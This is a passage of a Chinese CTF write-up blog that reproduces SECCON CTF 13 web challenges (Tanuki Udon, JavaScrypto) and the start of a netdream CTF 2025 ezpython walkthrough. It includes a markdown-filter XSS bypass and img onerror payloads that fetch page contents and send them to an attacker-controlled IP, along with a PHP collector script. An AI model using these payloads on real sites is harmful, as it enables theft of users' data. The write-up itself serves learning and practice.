class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">const</span> crypto = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;node:crypto&#x27;</span>);<br><span class="hljs-keyword">const</span> express = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;express&#x27;</span>);<br><span class="hljs-keyword">const</span> session = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;express-session&#x27;</span>);<br><span class="hljs-keyword">const</span> db = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;./db&#x27;</span>);<br><span class="hljs-keyword">const</span> markdown = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;./markdown&#x27;</span>);<br><br><span class="hljs-keyword">const</span> <span class="hljs-variable constant_">PORT</span> = <span class="hljs-string">&#x27;3000&#x27;</span>;<br><br><span class="hljs-keyword">const</span> app = <span class="hljs-title function_">express</span>();<br><br>app.<span class="hljs-title function_">use</span>(express.<span class="hljs-title function_">urlencoded</span>(&#123; <span class="hljs-attr">extended</span>: <span class="hljs-literal">false</span> &#125;));<br>app.<span class="hljs-title function_">use</span>(<span class="hljs-title function_">session</span>(&#123;<br>  <span class="hljs-attr">secret</span>: crypto.<span class="hljs-title function_">randomBytes</span>(<span class="hljs-number">32</span>).<span class="hljs-title function_">toString</span>(<span class="hljs-string">&#x27;base64&#x27;</span>),<br>  <span class="hljs-attr">resave</span>: <span class="hljs-literal">true</span>, <br>  <span class="hljs-attr">saveUninitialized</span>: <span class="hljs-literal">true</span>, <br>&#125;));<br>app.<span class="hljs-title function_">set</span>(<span class="hljs-string">&#x27;view engine&#x27;</span>, <span class="hljs-string">&#x27;ejs&#x27;</span>);<br><br>app.<span class="hljs-title function_">use</span>(<span class="hljs-function">(<span class="hljs-params">req, res, next</span>) =&gt;</span> &#123;<br>  <span class="hljs-keyword">if</span> (!req.<span class="hljs-property">session</span>.<span class="hljs-property">userId</span>) &#123;<br>    req.<span class="hljs-property">session</span>.<span class="hljs-property">userId</span> = db.<span class="hljs-title function_">createUser</span>().<span class="hljs-property">id</span>;<br>  &#125;<br>  req.<span class="hljs-property">user</span> = db.<span class="hljs-title function_">getUser</span>(req.<span class="hljs-property">session</span>.<span class="hljs-property">userId</span>);<br>  <span class="hljs-title function_">next</span>();<br>&#125;)<br><br>app.<span class="hljs-title function_">use</span>(<span class="hljs-function">(<span class="hljs-params">req, res, next</span>) =&gt;</span> &#123;<br>  <span class="hljs-keyword">if</span> (<span class="hljs-keyword">typeof</span> req.<span class="hljs-property">query</span>.<span class="hljs-property">k</span> === <span class="hljs-string">&#x27;string&#x27;</span> &amp;&amp; <span class="hljs-keyword">typeof</span> req.<span class="hljs-property">query</span>.<span class="hljs-property">v</span> === <span class="hljs-string">&#x27;string&#x27;</span>) &#123;<br>    <span class="hljs-comment">// Forbidden :)</span><br>    <span class="hljs-keyword">if</span> (req.<span class="hljs-property">query</span>.<span class="hljs-property">k</span>.<span class="hljs-title function_">toLowerCase</span>().<span class="hljs-title function_">includes</span>(<span class="hljs-string">&#x27;content&#x27;</span>)) <span class="hljs-keyword">return</span> <span class="hljs-title function_">next</span>();<br><br>    res.<span class="hljs-title function_">header</span>(req.<span class="hljs-property">query</span>.<span class="hljs-property">k</span>, req.<span class="hljs-property">query</span>.<span class="hljs-property">v</span>);<br>  &#125;<br>  <span class="hljs-title function_">next</span>();<br>&#125;);<br><br>app.<span class="hljs-title function_">get</span>(<span class="hljs-string">&#x27;/&#x27;</span>, <span class="hljs-function">(<span class="hljs-params">req, res</span>) =&gt;</span> &#123;<br>  res.<span class="hljs-title function_">render</span>(<span class="hljs-string">&#x27;index&#x27;</span>, &#123; <span class="hljs-attr">notes</span>: req.<span class="hljs-property">user</span>.<span class="hljs-title function_">getNotes</span>() &#125;);<br>&#125;);<br><br>app.<span class="hljs-title function_">get</span>(<span class="hljs-string">&#x27;/clear&#x27;</span>, <span class="hljs-function">(<span class="hljs-params">req, res</span>) =&gt;</span> &#123;<br>  db.<span class="hljs-title function_">deleteUser</span>(req.<span class="hljs-property">user</span>.<span class="hljs-property">id</span>);<br>  req.<span class="hljs-property">session</span>.<span class="hljs-title function_">destroy</span>();<br>  res.<span class="hljs-title function_">redirect</span>(<span class="hljs-string">&#x27;/&#x27;</span>);<br>&#125;);<br><br>app.<span class="hljs-title function_">get</span>(<span class="hljs-string">&#x27;/note/:noteId&#x27;</span>, <span class="hljs-function">(<span class="hljs-params">req, res</span>) =&gt;</span> &#123;<br>  <span class="hljs-keyword">const</span> &#123; noteId &#125; = req.<span class="hljs-property">params</span>;<br>  <span class="hljs-keyword">const</span> note = db.<span class="hljs-title function_">getNote</span>(noteId);<br>  <span class="hljs-keyword">if</span> (!note) <span class="hljs-keyword">return</span> res.<span class="hljs-title function_">status</span>(<span class="hljs-number">400</span>).<span class="hljs-title function_">send</span>(<span class="hljs-string">&#x27;Note not found&#x27;</span>);<br>  res.<span class="hljs-title function_">render</span>(<span class="hljs-string">&#x27;note&#x27;</span>, &#123; note &#125;);<br>&#125;);<br><br>app.<span class="hljs-title function_">post</span>(<span class="hljs-string">&#x27;/note&#x27;</span>, <span class="hljs-function">(<span class="hljs-params">req, res</span>) =&gt;</span> &#123;<br>  <span class="hljs-keyword">const</span> &#123; title, content &#125; = req.<span class="hljs-property">body</span>;<br>  req.<span class="hljs-property">user</span>.<span class="hljs-title function_">addNote</span>(db.<span class="hljs-title function_">createNote</span>(&#123; title, <span class="hljs-attr">content</span>: <span class="hljs-title function_">markdown</span>(content) &#125;));<br>  res.<span class="hljs-title function_">redirect</span>(<span class="hljs-string">&#x27;/&#x27;</span>);<br>&#125;);<br><br>app.<span class="hljs-title function_">listen</span>(<span class="hljs-variable constant_">PORT</span>, <span class="hljs-string">&#x27;0.0.0.0&#x27;</span>, <span class="hljs-function">() =&gt;</span> &#123;<br>  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`Listening on port <span class="hljs-subst">$&#123;PORT&#125;</span>`</span>);<br>&#125;);<br></code></pre></td></tr></table></figure><p>db.js应该是数据库配置文件<br>然后web目录下的markdown.js有关键词转化代码：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">const</span> <span class="hljs-title function_">escapeHtml</span> = (<span class="hljs-params">content</span>) =&gt; &#123;<br>  <span class="hljs-keyword">return</span> content<br>    .<span class="hljs-title function_">replaceAll</span>(<span class="hljs-string">&#x27;&amp;&#x27;</span>, <span class="hljs-string">&#x27;&amp;&#x27;</span>)<br>    .<span class="hljs-title function_">replaceAll</span>(<span class="hljs-string">`&quot;`</span>, <span class="hljs-string">&#x27;&quot;&#x27;</span>)<br>    .<span class="hljs-title function_">replaceAll</span>(<span class="hljs-string">`&#x27;`</span>, <span class="hljs-string">&#x27;&#x27;</span><span class="hljs-string">&#x27;)</span><br><span class="hljs-string">    .replaceAll(&#x27;</span>&lt;<span class="hljs-string">&#x27;, &#x27;</span>&lt;<span class="hljs-string">&#x27;)</span><br><span class="hljs-string">    .replaceAll(&#x27;</span>&gt;<span class="hljs-string">&#x27;, &#x27;</span>&gt;<span class="hljs-string">&#x27;);</span><br><span class="hljs-string">&#125;</span><br><span class="hljs-string"></span><br><span class="hljs-string">const markdown = (content) =&gt; &#123;</span><br><span class="hljs-string">  const escaped = escapeHtml(content);</span><br><span class="hljs-string">  return escaped</span><br><span class="hljs-string">    .replace(/!\[([^&quot;]*?)\]\(([^&quot;]*?)\)/g, `&lt;img alt=&quot;$1&quot; src=&quot;$2&quot;&gt;&lt;/img&gt;`)</span><br><span class="hljs-string">    .replace(/\[(.*?)\]\(([^&quot;]*?)\)/g, `&lt;a href=&quot;$2&quot;&gt;$1&lt;/a&gt;`)</span><br><span class="hljs-string">    .replace(/\*\*(.*?)\*\*/g, `&lt;strong&gt;$1&lt;/strong&gt;`)</span><br><span class="hljs-string">    .replace(/  $/mg, `&lt;br&gt;`);</span><br><span class="hljs-string">&#125;</span><br><span class="hljs-string"></span><br><span class="hljs-string">module.exports = markdown;</span><br></code></pre></td></tr></table></figure><p>其中escapeHtml方法是过滤xss关键词的，然后markdown方法就是实现在留言中插入图片和连接的功能<br>那如何如何绕过呢？<br>学习一下大佬的<a href="https://zoiltin.github.io/posts/ctf%E8%AE%B0%E5%BD%95-seccon_ctf_13th_quals-alpacahack_round_7/">wp</a></p><p><strong>“问题在于replace执行是有顺序的，前一个的img标签的引号可以通过a标签破坏。”</strong></p><p>意思是有办法能构造破坏a的标签，然后使用img里的方法来实现xss</p><p>自己手动算了一下大佬的payload，理解了不少。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs js">paylaod content = <span class="hljs-string">&#x27;![]([)]()&#x27;</span><br><br><span class="hljs-attr">payload</span>:<br>![]([)]( onerror=alert<span class="hljs-string">`1`</span> <span class="hljs-keyword">class</span>=)<br></code></pre></td></tr></table></figure><p>经过escape，img和a的正则替换后能在最后一个括号里插入img，</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs js">&lt;img alt=<span class="hljs-string">&quot;&quot;</span> src=<span class="hljs-string">&quot;&lt;a href=&quot;</span> onerror=alert<span class="hljs-string">`1`</span> <span class="hljs-keyword">class</span>=<span class="hljs-string">&quot;&gt;&quot;</span>&gt;&lt;<span class="hljs-regexp">/img&gt;&lt;/</span>a&gt;<br></code></pre></td></tr></table></figure><p>然后到分析bot服务，bot服务会用来来访问我们构造好的包含xss的文章，并且在“&#x2F;”目录下生成带有flag的文章。<br>很明显就是让bot访问note板的服务</p><p>paylaod:</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">var</span> d;<br><span class="hljs-title function_">fetch</span>(<span class="hljs-string">&quot;/&quot;</span>).<span class="hljs-title function_">then</span>(<span class="hljs-function">(<span class="hljs-params">r</span>) =&gt;</span> r.<span class="hljs-title function_">text</span>()).<span class="hljs-title function_">then</span>(<span class="hljs-function">(<span class="hljs-params">data</span>) =&gt;</span> &#123;d = data&#125;);<br><span class="hljs-built_in">setTimeout</span>(<span class="hljs-function">() =&gt;</span> &#123;<span class="hljs-title function_">fetch</span>(<span class="hljs-string">&#x27;http://192.168.75.1:80?data=&#x27;</span> + <span class="hljs-built_in">encodeURI</span>(d))&#125;, <span class="hljs-number">500</span>);<br><br>编码后：<br>![<span class="hljs-number">1</span>]([)]( onerror=location=<span class="hljs-string">`javascript:var%20d%3Bfetch%28%22%2F%22%29%2Ethen%28%28r%29%20%3D%3E%20r%2Etext%28%29%29%2Ethen%28%28data%29%20%3D%3E%20%7Bd%20%3D%20data%7D%29%3BsetTimeout%28%28%29%20%3D%3E%20%7Bfetch%28%27http%3A%2F%2F192.168.10.10%3A80%3Fdata%3D%27%20%2B%20encodeURI%28d%29%29%7D%2C%20500%29%3B`</span> <span class="hljs-keyword">class</span>=)<br><br><br></code></pre></td></tr></table></figure><p>在自己的80端口部署服务来获取返回的信息：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">file_put_contents</span>(<span class="hljs-keyword">__DIR__</span> . <span class="hljs-string">&#x27;/data.txt&#x27;</span>, <span class="hljs-variable">$_REQUEST</span>[<span class="hljs-string">&#x27;data&#x27;</span>]);<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;OK&#x27;</span>;<br></code></pre></td></tr></table></figure><h2 id="JavaScrypto"><a href="#JavaScrypto" class="headerlink" title="JavaScrypto"></a>JavaScrypto</h2><p>和Tanuki Udon 很想啊，部署的时候发现bot服务等配置都是一样的</p><p>index.js源码：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">const</span> express = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;express&#x27;</span>);<br><span class="hljs-keyword">const</span> crypto = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;crypto&#x27;</span>);<br><span class="hljs-keyword">const</span> app = <span class="hljs-title function_">express</span>();<br><span class="hljs-keyword">const</span> <span class="hljs-variable constant_">PORT</span> = <span class="hljs-number">3000</span>;<br><br><span class="hljs-keyword">const</span> <span class="hljs-title function_">isUUID</span> = (<span class="hljs-params">uuid</span>) =&gt; <span class="hljs-regexp">/^[0-9a-f]&#123;8&#125;-[0-9a-f]&#123;4&#125;-[0-5][0-9a-f]&#123;3&#125;-[089ab][0-9a-f]&#123;3&#125;-[0-9a-f]&#123;12&#125;$/i</span>.<span class="hljs-title function_">test</span>(uuid);<br><br><span class="hljs-keyword">const</span> notes = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Map</span>();<br><br>app.<span class="hljs-title function_">use</span>(express.<span class="hljs-title function_">static</span>(<span class="hljs-string">&#x27;public&#x27;</span>));<br>app.<span class="hljs-title function_">use</span>(express.<span class="hljs-title function_">json</span>());<br><br>app.<span class="hljs-title function_">get</span>(<span class="hljs-string">&#x27;/note/:noteId&#x27;</span>, <span class="hljs-function">(<span class="hljs-params">req, res</span>) =&gt;</span> &#123;<br><br>  <span class="hljs-keyword">if</span> (!<span class="hljs-title function_">isUUID</span>(req.<span class="hljs-property">params</span>.<span class="hljs-property">noteId</span>)) <span class="hljs-keyword">return</span> res.<span class="hljs-title function_">status</span>(<span class="hljs-number">404</span>).<span class="hljs-title function_">send</span>(<span class="hljs-string">&#x27;&#x27;</span>);<br><br>  <span class="hljs-keyword">const</span> note = notes.<span class="hljs-title function_">get</span>(req.<span class="hljs-property">params</span>.<span class="hljs-property">noteId</span>);<br>  <span class="hljs-keyword">if</span> (!note) <span class="hljs-keyword">return</span> res.<span class="hljs-title function_">status</span>(<span class="hljs-number">404</span>).<span class="hljs-title function_">send</span>(<span class="hljs-string">&#x27;&#x27;</span>);<br><br>  <span class="hljs-keyword">return</span> res.<span class="hljs-title function_">json</span>(note);<br><br>&#125;);<br><br>app.<span class="hljs-title function_">post</span>(<span class="hljs-string">&#x27;/note&#x27;</span>, <span class="hljs-function">(<span class="hljs-params">req, res</span>) =&gt;</span> &#123;<br><br>  <span class="hljs-keyword">const</span> &#123; iv, ciphertext &#125; = req.<span class="hljs-property">body</span>;<br>  <span class="hljs-keyword">if</span> (<br>    <span class="hljs-keyword">typeof</span> iv !== <span class="hljs-string">&#x27;string&#x27;</span><br>    || <span class="hljs-keyword">typeof</span> ciphertext !== <span class="hljs-string">&#x27;string&#x27;</span><br>  ) &#123;<br>    <span class="hljs-keyword">return</span> res.<span class="hljs-title function_">status</span>(<span class="hljs-number">400</span>).<span class="hljs-title function_">send</span>(<span class="hljs-string">&#x27;&#x27;</span>);<br>  &#125;<br><br>  <span class="hljs-keyword">const</span> id = crypto.<span class="hljs-title function_">randomUUID</span>();<br>  notes.<span class="hljs-title function_">set</span>(id, &#123; iv, ciphertext &#125;);<br>  <br>  <span class="hljs-keyword">return</span> res.<span class="hljs-title function_">json</span>(&#123; id &#125;);<br><br>&#125;);<br><br>app.<span class="hljs-title function_">listen</span>(<span class="hljs-variable constant_">PORT</span>, <span class="hljs-function">() =&gt;</span> &#123;<br>  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`Server listening on port <span class="hljs-subst">$&#123;PORT&#125;</span>`</span>)<br>&#125;);<br></code></pre></td></tr></table></figure><p>fuzz一下，发现没做过滤：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs js">&lt;a href=<span class="hljs-string">&quot;http://gwwafz.online&quot;</span>&gt;hihi&lt;/a&gt;<br></code></pre></td></tr></table></figure><p>那可能就比上一题简单了<br>把上一题的payload拿来用：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs js">&lt;img src=x onerror=<span class="hljs-string">&quot;fetch(&#x27;http://192.168.230.241/?data=&#x27;+encodeURIComponent(document.body.innerHTML))&quot;</span>&gt;<br></code></pre></td></tr></table></figure><p>然后发现返回的数据并不符合预期<br>看了<a href="https://zoiltin.github.io/posts/ctf%E8%AE%B0%E5%BD%95-seccon_ctf_13th_quals-alpacahack_round_7/">wp</a>,发现没自己想的这么简单。。。<br>继续分析源码 note.js:</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">const</span> <span class="hljs-title function_">getOrCreateKey</span> = (<span class="hljs-params"></span>) =&gt; &#123;<br>  <span class="hljs-keyword">if</span> (!<span class="hljs-variable language_">localStorage</span>.<span class="hljs-title function_">getItem</span>(<span class="hljs-string">&#x27;key&#x27;</span>)) &#123;<br>    <span class="hljs-keyword">const</span> rawKey = <span class="hljs-title class_">CryptoJS</span>.<span class="hljs-property">lib</span>.<span class="hljs-property">WordArray</span>.<span class="hljs-title function_">random</span>(<span class="hljs-number">16</span>);<br>    <span class="hljs-variable language_">localStorage</span>.<span class="hljs-title function_">setItem</span>(<span class="hljs-string">&#x27;key&#x27;</span>, rawKey.<span class="hljs-title function_">toString</span>(<span class="hljs-title class_">CryptoJS</span>.<span class="hljs-property">enc</span>.<span class="hljs-property">Base64</span>));<br>  &#125;<br>  <span class="hljs-keyword">return</span> <span class="hljs-variable language_">localStorage</span>.<span class="hljs-title function_">getItem</span>(<span class="hljs-string">&#x27;key&#x27;</span>);<br>&#125;<br><br><span class="hljs-keyword">const</span> <span class="hljs-title function_">encryptNote</span> = (<span class="hljs-params">&#123; plaintext, key &#125;</span>) =&gt; &#123;<br>  <span class="hljs-keyword">const</span> rawKey = <span class="hljs-title class_">CryptoJS</span>.<span class="hljs-property">enc</span>.<span class="hljs-property">Base64</span>.<span class="hljs-title function_">parse</span>(key);<br>  <span class="hljs-keyword">const</span> rawIv = <span class="hljs-title class_">CryptoJS</span>.<span class="hljs-property">lib</span>.<span class="hljs-property">WordArray</span>.<span class="hljs-title function_">random</span>(<span class="hljs-number">16</span>);<br>  <span class="hljs-keyword">const</span> rawSalt = <span class="hljs-title class_">CryptoJS</span>.<span class="hljs-property">lib</span>.<span class="hljs-property">WordArray</span>.<span class="hljs-title function_">random</span>(<span class="hljs-number">16</span>);<br>  <span class="hljs-keyword">const</span> rawCiphertext = <span class="hljs-title class_">CryptoJS</span>.<span class="hljs-property">AES</span>.<span class="hljs-title function_">encrypt</span>(plaintext, rawKey, &#123;<br>    <span class="hljs-attr">iv</span>: rawIv, <br>    <span class="hljs-attr">salt</span>: rawSalt, <br>  &#125;).<span class="hljs-property">ciphertext</span>;<br>  <span class="hljs-keyword">return</span> &#123;<br>    <span class="hljs-attr">iv</span>: rawIv.<span class="hljs-title function_">toString</span>(<span class="hljs-title class_">CryptoJS</span>.<span class="hljs-property">enc</span>.<span class="hljs-property">Base64</span>), <br>    <span class="hljs-attr">ciphertext</span>: rawCiphertext.<span class="hljs-title function_">toString</span>(<span class="hljs-title class_">CryptoJS</span>.<span class="hljs-property">enc</span>.<span class="hljs-property">Base64</span>), <br>  &#125;<br>&#125;<br><br><span class="hljs-keyword">const</span> <span class="hljs-title function_">decryptNote</span> = (<span class="hljs-params">&#123; key, iv, ciphertext &#125;</span>) =&gt; &#123;<br>  <span class="hljs-keyword">const</span> rawKey = <span class="hljs-title class_">CryptoJS</span>.<span class="hljs-property">enc</span>.<span class="hljs-property">Base64</span>.<span class="hljs-title function_">parse</span>(key);<br>  <span class="hljs-keyword">const</span> rawIv = <span class="hljs-title class_">CryptoJS</span>.<span class="hljs-property">enc</span>.<span class="hljs-property">Base64</span>.<span class="hljs-title function_">parse</span>(iv);<br>  <span class="hljs-keyword">const</span> rawPlaintext = <span class="hljs-title class_">CryptoJS</span>.<span class="hljs-property">AES</span>.<span class="hljs-title function_">decrypt</span>(ciphertext, rawKey, &#123;<br>    <span class="hljs-attr">iv</span>: rawIv, <br>  &#125;);<br>  <span class="hljs-keyword">return</span> rawPlaintext.<span class="hljs-title function_">toString</span>(<span class="hljs-title class_">CryptoJS</span>.<span class="hljs-property">enc</span>.<span class="hljs-property">Latin1</span>);<br>&#125;<br><br><span class="hljs-keyword">const</span> <span class="hljs-title function_">createNote</span> = <span class="hljs-keyword">async</span> (<span class="hljs-params">&#123; plaintext, key &#125;</span>) =&gt; &#123;<br>  <span class="hljs-keyword">const</span> cipherParams = <span class="hljs-title function_">encryptNote</span>(&#123; plaintext, key &#125;);<br>  <span class="hljs-keyword">const</span> &#123; id &#125; = <span class="hljs-keyword">await</span> <span class="hljs-title function_">fetch</span>(<span class="hljs-string">&#x27;/note&#x27;</span>, &#123;<br>    <span class="hljs-attr">method</span>: <span class="hljs-string">&#x27;POST&#x27;</span>, <br>    <span class="hljs-attr">body</span>: <span class="hljs-title class_">JSON</span>.<span class="hljs-title function_">stringify</span>(cipherParams), <br>    <span class="hljs-attr">headers</span>: &#123;<br>      <span class="hljs-string">&#x27;content-type&#x27;</span>: <span class="hljs-string">&#x27;application/json&#x27;</span><br>    &#125;<br>  &#125;).<span class="hljs-title function_">then</span>(<span class="hljs-function"><span class="hljs-params">r</span> =&gt;</span> r.<span class="hljs-title function_">json</span>());<br>  <span class="hljs-keyword">return</span> id;<br>&#125;<br><br><span class="hljs-keyword">const</span> <span class="hljs-title function_">readNote</span> = <span class="hljs-keyword">async</span> (<span class="hljs-params">&#123; id, key &#125;</span>) =&gt; &#123;<br>  <span class="hljs-keyword">const</span> cipherParams = <span class="hljs-keyword">await</span> <span class="hljs-title function_">fetch</span>(<span class="hljs-string">`/note/<span class="hljs-subst">$&#123;id&#125;</span>`</span>).<span class="hljs-title function_">then</span>(<span class="hljs-function"><span class="hljs-params">r</span> =&gt;</span> r.<span class="hljs-title function_">json</span>());<br>  <span class="hljs-keyword">const</span> &#123; iv, ciphertext &#125; = cipherParams;<br>  <span class="hljs-keyword">return</span> <span class="hljs-title function_">decryptNote</span>(&#123; key, iv, ciphertext &#125;);<br>&#125;<br><br></code></pre></td></tr></table></figure><p>仔细观摩了wp，发现这道题大概远超我目前水平，那就，前面的题目以后再来解吧。。。  </p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>netdream</title>
    <link href="/2025/09/08/netdream/"/>
    <url>/2025/09/08/netdream/</url>
    
    <content type="html"><![CDATA[<h1 id="netdream-ctf-2025"><a href="#netdream-ctf-2025" class="headerlink" title="netdream ctf 2025"></a>netdream ctf 2025</h1><p>暑假都在玩了，本想上机看一眼题目，结果超神服务器看都不给看。</p><p>找到了web题目源码来复现一下</p><h2 id="ezpython"><a href="#ezpython" class="headerlink" title="ezpython"></a>ezpython</h2><p>打开按f12，</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">html</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">html</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">src</span></span><br><span class="hljs-tag">    &lt;<span class="hljs-attr">title</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span><br>    <span class="hljs-comment">&lt;!-- ：/s3c0nd --&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span><br>  <br></code></pre></td></tr></table></figure><p>访问&#x2F;s3c0nd</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">html</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">html</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>S3c0nd<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">h1</span>&gt;</span>only fuzz(number)<span class="hljs-tag">&lt;/<span class="hljs-name">h1</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span><br>  <br></code></pre></td></tr></table></figure><p>没太明白题目想表达什么，要fuzz数字，但是要从哪里传入呢？</p><p>post吗？还是get？参数是什么？</p><p>用fuzz当参数试了post和get 0-10000，都没结果，去看wp</p><p>结果是，爆破路径吗？</p><p>这，很牛逼了。。。</p><p>看来是我的fuzz思路不够</p><p>然后访问 &#x2F;114514：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">html</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">html</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>野兽先辈の住所<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">h1</span>&gt;</span>你好 guest！<span class="hljs-tag">&lt;/<span class="hljs-name">h1</span>&gt;</span><br>    <span class="hljs-comment">&lt;!-- 听说访问该页面的某get参数的某个数值可以爆源码 --&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span><br>  